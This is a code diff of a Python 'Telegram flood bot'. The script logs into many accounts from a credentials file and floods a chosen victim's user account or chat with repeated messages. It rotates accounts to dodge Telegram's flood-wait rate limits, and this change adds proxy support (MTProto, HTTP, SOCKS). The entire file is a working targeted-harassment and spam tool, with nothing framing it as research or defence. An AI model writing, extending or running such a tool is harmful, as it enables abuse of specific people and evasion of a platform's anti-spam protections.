@@ -1,65 +1,54 @@
 #!/usr/bin/env python
-import argparse
 import asyncio
 import time
 import secrets
+import config
 from threading import Timer
 from functools import partial
 from tqdm import tqdm
 from dotenv import dotenv_values
 from telethon.sync import TelegramClient
-from telethon import types, errors
+from telethon import types, errors, connection
 
-parser = argparse.ArgumentParser(description="Teleflood - Telegram Flood Bot")
-parser.add_argument('--config-file', type=str, default="config.txt",
-                    help="file with config for the bot in format described on https://github.com/D3rise/teleflood/README.md")
-parser.add_argument('--accounts-file', type=str,
-                    help="file with credentials for accounts to flood from")
-parser.add_argument('--message-count', type=int,
-                    help="count of messages to send")
-parser.add_argument('--victim-id', type=str,
-                    help="a user id to whom the messages will be sent, can be a phone number, username but not actual ID (if you have not yet flooded this victim)")
-parser.add_argument('--message', type=str,
-                    help="a message that will be sent to victim")
-
-# Parse args and read the config file to log bot in with
-args = parser.parse_args()
-config = dotenv_values(args.config_file)
-loop = asyncio.get_event_loop()
+# Lists for working clients, waiting clients and timers for them
 clients = []
 waiting_clients = []
 waiting_clients_timers = []
 
-message = args.message or config.get("MESSAGE")
-message_count = args.message_count or int(config.get("MESSAGE_COUNT"))
-victim_id = args.victim_id or config.get("VICTIM_ID")
-accounts_file_path = args.accounts_file or config.get(
-    "ACCOUNTS_FILE") or "accounts.txt"
-
 
 async def start_flood(victim):
+    """Starts the flood process.
+
+            Parameters:
+                    victim (telethon.types.User|telethon.types.Chat): A victim (user/chat) entity to flood
+    """
     global waiting_clients_timers, waiting_clients, clients, message, message_count
 
-    # Removes client from waiting clients list and adds it to working clients list
     def remove_client_from_waiting_clients(client):
+        """
+        Removes client from waiting clients list 
+        and adds it to working clients list
+        """
         global waiting_clients_timers
         waiting_clients.remove(client)
         waiting_clients_timers = list(filter(
             lambda timer: timer["client"] == client, waiting_clients_timers))
         clients.append(client)
 
-    # Gets timer from waiting clients timers
-    # list with minimum time of required waiting and returns it
     def get_timer_with_min_wait_time():
+        """
+        Gets timer from waiting clients timers list with
+        minimum time of required waiting and returns it
+        """
         return min(waiting_clients_timers, key=lambda timer: timer["seconds"])
 
     # An actual flood process, tqdm is for progressbar
-    for _ in tqdm(range(message_count), desc="Flooding", unit="messages"):
+    for _ in tqdm(range(config.message_count), desc="Flooding", unit="messages"):
         # Choose client randomly from working clients list
         client = secrets.choice(clients)
 
         try:
-            await client.send_message(victim, message)
+            await client.send_message(victim, config.message)
         except errors.FloodWaitError as error:
             # If telegram sends us a flood waiting error,
             # we will remove client from working clients and
@@ -84,7 +73,7 @@ async def start_flood(victim):
 
 async def main():
     # Read and log into all accounts from accounts file
-    with open(accounts_file_path, 'r') as accounts_file:
+    with open(config.accounts_file_path, 'r') as accounts_file:
         # Reading file line-by-line to prevent memory troubles
         account = accounts_file.readline()
         line_number = 1
@@ -121,11 +110,52 @@ async def main():
                 return input(f"Enter the code for {phone_number}: ")
 
             # Using phone_number[1:] to prevent saving "+" in phone number too
-            client = TelegramClient(
-                f"client_{phone_number[1:]}",
-                api_id,
-                api_hash)
+            session_id = f"client_{phone_number[1:]}"
 
+            # If proxy isn't None and it equals to MTPROTO, we
+            # will config client to work with MTPROTO proxy,
+            # and if it's not MTPROTO, we will config client to
+            # work with PySocks (HTTP, SOCKS4 or SOCKS5) proxy
+            if config.proxy_type != None:
+
+                # If proxy type is MTPROTO
+                if config.proxy_type == "MTPROTO":
+                    proxy = (config.proxy_addr, config.proxy_port,
+                             config.proxy_password)
+
+                    client = TelegramClient(
+                        session_id,
+                        api_id,
+                        api_hash,
+                        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
+                        proxy=proxy)
+
+                # If proxy type is HTTP, SOCKS4 or SOCKS5
+                else:
+                    proxy = {
+                        "proxy_type": config.proxy_type,
+                        "addr": config.proxy_addr,
+                        "port": config.proxy_port,
+                        "rdns": config.proxy_rdns,
+                        "username": config.proxy_username,
+                        "password": config.proxy_password
+                    }
+
+                    client = TelegramClient(
+                        session_id,
+                        api_id,
+                        api_hash,
+                        proxy=proxy)
+            else:
+                # If proxy isn't enabled, we will init
+                # standart client instance
+                client = TelegramClient(
+                    session_id,
+                    api_id,
+                    api_hash)
+
+            # Starts client (create session and
+            # request auth code if required)
             await client.start(
                 phone_number,
                 password,
@@ -134,26 +164,35 @@ async def main():
             # Add client to working clients list
             clients.append(client)
 
+            # This client is ready, so we will go to next line
             go_to_next_line()
 
+        # If all accounts are not ready to use
+        # or there's no accounts in accounts file
         if len(clients) == 0:
             print(
-                f"Error: there isn't any account credentials in {accounts_file_path}!")
+                f"Fatal: there isn't any valid account credentials in {config.accounts_file_path}!")
             exit(1)
 
     # Get victim account using victim_id
-    victim = await clients[0].get_entity(victim_id)
+    victim = await clients[0].get_entity(config.victim_id)
 
     # If victim is actually a user or a chat
     if isinstance(victim, types.User) or isinstance(victim, types.Chat):
         flood_prompt = input(
-            f"Found account/chat with id {victim.id}. Start flooding with {message_count} messages? Y/n: ").lower()
+            f"Found account/chat with id {victim.id}. Start flooding with {config.message_count} messages? Y/n: ").lower()
+
+        # Y (yes) is default value, so if user
+        # inputs an empty string, we will
+        # use start flooding. If it's not,
+        # we will abort the operation
         if flood_prompt == "" or flood_prompt == "y":
             await start_flood(victim)
             print(
-                f"Sent {message_count} messages with content \"{message}\" to account/chat with id {victim.id}")
+                f"Sent {config.message_count} messages with content \"{config.message}\" to account/chat with id {victim.id}")
         else:
             print("Aborted.")
 
-# Start event loop and main function in it
+# Start event loop and await main function in it
+loop = asyncio.get_event_loop()
 loop.run_until_complete(main())
